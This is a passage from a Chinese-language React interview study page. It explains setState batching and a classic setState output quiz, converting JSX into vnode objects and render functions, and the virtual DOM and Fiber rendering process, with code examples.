<span class="token comment">// react事件是合成事件，在合成事件中isBatchingUpdate需要设置为true</span>
<span class="token comment">// 模拟react中事件点击</span>
<span class="token keyword">function</span> <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  isBatchingUpdate<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 批量更新标志</span>

  <span class="token comment">/**我们自己逻辑开始 */</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">number</span><span class="token operator">:</span>state<span class="token punctuation">.</span>number<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
  <span class="token comment">/**我们自己逻辑结束 */</span>

  state<span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">newState<span class="token punctuation">,</span>action</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token operator">...</span>newState<span class="token punctuation">,</span><span class="token operator">...</span>action<span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> 

  isBatchingUpdate<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 执行结束设置false</span>
<span class="token punctuation">}</span>
<span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
</code></pre></div><ol start="3"><li><code>transaction</code>事务机制</li></ol> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/4b2c232c6b39d3ac.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/5a0b0ab821739984.png" loading="lazy" class="lazy"> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/ad98ab68ffa45716.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState现象演示</span>

<span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token comment">// 函数组件（后面会讲），默认没有 state</span>
<span class="token keyword">class</span> <span class="token class-name">StateDemo</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>

        <span class="token comment">// 第一，state 要在构造函数中定义</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>count<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>increase<span class="token punctuation">}</span><span class="token operator">&gt;</span>累加<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token punctuation">}</span>
    <span class="token function-variable function">increase</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token comment">// // 第二，不要直接修改 state ，使用不可变值 ----------------------------</span>
        <span class="token comment">// // this.state.count++ // 错误</span>
        <span class="token comment">// this.setState({</span>
        <span class="token comment">//     count: this.state.count + 1 // SCU</span>
        <span class="token comment">// })</span>
        <span class="token comment">// 操作数组、对象的的常用形式</span>

        <span class="token comment">// 第三，setState 可能是异步更新（有可能是同步更新） ----------------------------</span>
        
        <span class="token comment">// this.setState({</span>
        <span class="token comment">//     count: this.state.count + 1</span>
        <span class="token comment">// }, () =&gt; {</span>
        <span class="token comment">//     // 联想 Vue $nextTick - DOM</span>
        <span class="token comment">//     console.log('count by callback', this.state.count) // 回调函数中可以拿到最新的 state</span>
        <span class="token comment">// })</span>
        <span class="token comment">// console.log('count', this.state.count) // 异步的，拿不到最新值</span>

        <span class="token comment">// // setTimeout 中 setState 是同步的</span>
        <span class="token comment">// setTimeout(() =&gt; {</span>
        <span class="token comment">//     this.setState({</span>
        <span class="token comment">//         count: this.state.count + 1</span>
        <span class="token comment">//     })</span>
        <span class="token comment">//     console.log('count in setTimeout', this.state.count)</span>
        <span class="token comment">// }, 0)</span>

        <span class="token comment">// 自己定义的 DOM 事件，setState 是同步的。再 componentDidMount 中</span>

        <span class="token comment">// 第四，state 异步更新的话，更新前会被合并 ----------------------------</span>
        
        <span class="token comment">// 传入对象，会被合并（类似 Object.assign ）。执行结果只一次 +1</span>
        <span class="token comment">// this.setState({</span>
        <span class="token comment">//     count: this.state.count + 1</span>
        <span class="token comment">// })</span>
        <span class="token comment">// this.setState({</span>
        <span class="token comment">//     count: this.state.count + 1</span>
        <span class="token comment">// })</span>
        <span class="token comment">// this.setState({</span>
        <span class="token comment">//     count: this.state.count + 1</span>
        <span class="token comment">// })</span>
        
        <span class="token comment">// 传入函数，不会被合并。执行结果是 +3</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prevState<span class="token punctuation">,</span> props</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">count</span><span class="token operator">:</span> prevState<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prevState<span class="token punctuation">,</span> props</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">count</span><span class="token operator">:</span> prevState<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prevState<span class="token punctuation">,</span> props</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">count</span><span class="token operator">:</span> prevState<span class="token punctuation">.</span>count <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// bodyClickHandler = () =&gt; {</span>
    <span class="token comment">//     this.setState({</span>
    <span class="token comment">//         count: this.state.count + 1</span>
    <span class="token comment">//     })</span>
    <span class="token comment">//     console.log('count in body event', this.state.count)</span>
    <span class="token comment">// }</span>
    <span class="token comment">// componentDidMount() {</span>
    <span class="token comment">//     // 自己定义的 DOM 事件，setState 是同步的</span>
    <span class="token comment">//     document.body.addEventListener('click', this.bodyClickHandler)</span>
    <span class="token comment">// }</span>
    <span class="token comment">// componentWillUnmount() {</span>
    <span class="token comment">//     // 及时销毁自定义 DOM 事件</span>
    <span class="token comment">//     document.body.removeEventListener('click', this.bodyClickHandler)</span>
    <span class="token comment">//     // clearTimeout</span>
    <span class="token comment">// }</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> StateDemo

<span class="token comment">// -------------------------- 我是分割线 -----------------------------</span>

<span class="token comment">// 不可变值（函数式编程，纯函数） - 数组</span>
<span class="token comment">// const list5Copy = this.state.list5.slice()</span>
<span class="token comment">// list5Copy.splice(2, 0, 'a') // 中间插入/删除</span>
<span class="token comment">// this.setState({</span>
<span class="token comment">//     list1: this.state.list1.concat(100), // 追加</span>
<span class="token comment">//     list2: [...this.state.list2, 100], // 追加</span>
<span class="token comment">//     list3: this.state.list3.slice(0, 3), // 截取</span>
<span class="token comment">//     list4: this.state.list4.filter(item =&gt; item &gt; 100), // 筛选</span>
<span class="token comment">//     list5: list5Copy // 其他操作</span>
<span class="token comment">// })</span>
<span class="token comment">// // 注意，不能直接对 this.state.list 进行 push pop splice 等，这样违反不可变值</span>

<span class="token comment">// 不可变值 - 对象</span>
<span class="token comment">// this.setState({</span>
<span class="token comment">//     obj1: Object.assign({}, this.state.obj1, {a: 100}),</span>
<span class="token comment">//     obj2: {...this.state.obj2, a: 100}</span>
<span class="token comment">// })</span>
<span class="token comment">// // 注意，不能直接对 this.state.obj 进行属性设置，这样违反不可变值</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState笔试题考察 下面这道题输出什么</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// componentDidMount中isBatchingUpdate=true setState批量更新</span>
<span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// setState传入对象会合并，后面覆盖前面的Object.assign({})</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理 </span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 1 次 log</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 添加到queue队列中，等待处理</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 2 次 log</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 到这里this.state.val结果等于1了</span>
    <span class="token comment">// 在原生事件和setTimeout中（isBatchingUpdate=false），setState同步更新，可以马上获取更新后的值</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 3 次 log</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">// 同步更新</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token comment">// 第 4 次 log</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 答案：0, 0, 2, 3</span>
</code></pre></div><h3 id="根据jsx写出vnode和render函数"><a href="#根据jsx写出vnode和render函数" class="header-anchor">#</a> 根据jsx写出vnode和render函数</h3> <div class="language-html extra-class"><pre class="language-html"><code><span class="token comment">&lt;!-- jsx --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token special-attr"><span class="token attr-name">onClick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token punctuation">{</span>onClick<span class="token punctuation">}</span></span></span></span> <span class="token attr-name">data-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    hello <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span>{name}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>{imgSrc}</span> <span class="token punctuation">/&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MyComponent</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>{title}</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MyComponent</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><strong>注意</strong></p> <ul><li>注意<code>JSX</code>中的常量和变量</li> <li>注意<code>JSX</code>中的<code>HTML tag</code>和自定义组件</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> vnode <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'div'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">'container'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// &lt;p&gt;</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'p'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">dataset</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'p1'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token literal-property property">on</span><span class="token operator">:</span> <span class="token punctuation">{</span>
          <span class="token literal-property property">click</span><span class="token operator">:</span> onClick <span class="token comment">// 变量</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
        <span class="token string">'hello'</span><span class="token punctuation">,</span>
        <span class="token punctuation">{</span>
          <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'b'</span><span class="token punctuation">,</span>
          <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
          <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token comment">// name变量</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// &lt;img /&gt;</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">tag</span><span class="token operator">:</span> <span class="token string">'img'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">src</span><span class="token operator">:</span> imgSrc <span class="token comment">// 变量</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token comment">/**无子节点**/</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token comment">// &lt;MyComponent&gt;</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">tag</span><span class="token operator">:</span> MyComponent<span class="token punctuation">,</span> <span class="token comment">// 变量</span>
      <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">title</span><span class="token operator">:</span> title<span class="token punctuation">,</span> <span class="token comment">// 变量</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token comment">/**无子节点**/</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// render函数</span>
<span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// h(tag, props, children)</span>
  <span class="token keyword">return</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">'container'</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>

    <span class="token comment">// p</span>
    <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">dataset</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'p1'</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">on</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">click</span><span class="token operator">:</span> onClick
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token string">'hello'</span><span class="token punctuation">,</span>
      <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">// img</span>
    <span class="token function">h</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">src</span><span class="token operator">:</span> imgSrc
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token comment">/**无子节点**/</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment">// MyComponent</span>
    <span class="token function">h</span><span class="token punctuation">(</span>MyComponent<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">title</span><span class="token operator">:</span> title
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token comment">/**无子节点**/</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>在react中jsx编译后</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用https://babeljs.io/repl编译后效果</span>

React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
  <span class="token string">&quot;div&quot;</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    <span class="token literal-property property">className</span><span class="token operator">:</span> <span class="token string">&quot;container&quot;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>
    <span class="token string">&quot;p&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
      <span class="token literal-property property">onClick</span><span class="token operator">:</span> onClick<span class="token punctuation">,</span>
      <span class="token string-property property">&quot;data-name&quot;</span><span class="token operator">:</span> <span class="token string">&quot;p1&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">&quot;hello &quot;</span><span class="token punctuation">,</span>
    React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;img&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">src</span><span class="token operator">:</span> imgSrc
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  React<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>MyComponent<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">title</span><span class="token operator">:</span> title
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><h3 id="虚拟dom-vdom-真的很快吗"><a href="#虚拟dom-vdom-真的很快吗" class="header-anchor">#</a> 虚拟DOM（vdom）真的很快吗</h3> <ul><li><code>virutal DOM</code>，虚拟<code>DOM</code></li> <li>用JS对象模拟<code>DOM</code>节点数据</li> <li><code>vdom</code>并不快，<code>JS</code>直接操作<code>DOM</code>才是最快的
<ul><li>以<code>vue</code>为例，<code>data</code>变化 =&gt; <code>vnode diff</code> =&gt; 更新<code>DOM</code> 肯定是比不过直接操作<code>DOM</code>节点快的</li></ul></li> <li>但是&quot;数据驱动视图&quot;要有合适的技术方案，不能全部<code>DOM</code>重建</li> <li><code>dom</code>就是目前最合适的技术方案（并不是因为它快，而是合适）</li> <li>在大型系统中，全部更新<code>DOM</code>的成本太高，使用<code>vdom</code>把更新范围减少到最小</li></ul> <blockquote><p>并不是所有的框架都在用<code>vdom</code>，<code>svelte</code>就不用<code>vdom</code></p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/6632a7a051a60c4c.png" loading="lazy" class="lazy"></p> <h3 id="react组件渲染过程"><a href="#react组件渲染过程" class="header-anchor">#</a> react组件渲染过程</h3> <ul><li><code>JSX</code>如何渲染为页面</li> <li><code>setState</code>之后如何更新页面</li> <li>面试考察全流程</li></ul> <p><strong>1.组件渲染过程</strong></p> <ul><li>分析
<ul><li><code>props</code>、<code>state</code> 变化</li> <li><code>render()</code>生成<code>vnode</code></li> <li><code>patch(elem, vnode)</code> 渲染到页面上（<code>react</code>并一定用<code>patch</code>）</li></ul></li> <li>渲染过程
<ul><li><code>setState(newState)</code> =&gt; <code>newState</code>存入<code>pending</code>队列，判断是否处于<code>batchUpdate</code>状态，保存组件于<code>dirtyComponents</code>中（可能有子组件）
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/1ede1982d9eb5a45.png" loading="lazy" class="lazy"></li> <li>遍历所有的<code>dirtyComponents</code>调用<code>updateComponent</code>生成<code>newVnode</code></li> <li><code>patch(vnode,newVnode)</code></li></ul></li></ul> <p><strong>2.组件更新过程</strong></p> <ul><li><code>patch</code>更新被分为两个阶段
<ul><li><strong>reconciliation阶段</strong>：执行<code>diff</code>算法，纯<code>JS</code>计算</li> <li><strong>commit阶段</strong>：将<code>diff</code>结果渲染到<code>DOM</code>中</li></ul></li> <li>如果不拆分，可能有性能问题
<ul><li><code>JS</code>是单线程的，且和<code>DOM</code>渲染共用一个线程</li> <li>当组件足够复杂，组件更新时计算和渲染都压力大</li> <li>同时再有<code>DOM</code>操作需求（动画、鼠标拖拽等）将卡顿</li></ul></li> <li><strong>解决方案Fiber</strong> <ul><li><code>reconciliation</code>阶段拆分为多个子任务</li> <li><code>DOM</code>需要渲染时更新，空闲时恢复在执行计算</li> <li>通过<code>window.requestIdleCallback</code>来判断浏览器是否空闲</li></ul></li></ul> <h3 id="react-setstate经典面试题"><a href="#react-setstate经典面试题" class="header-anchor">#</a> React setState经典面试题</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// setState笔试题考察 下面这道题输出什么</span>
<span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token number">0</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">val</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
  <span class="token comment">// 第 1 次 log</span>
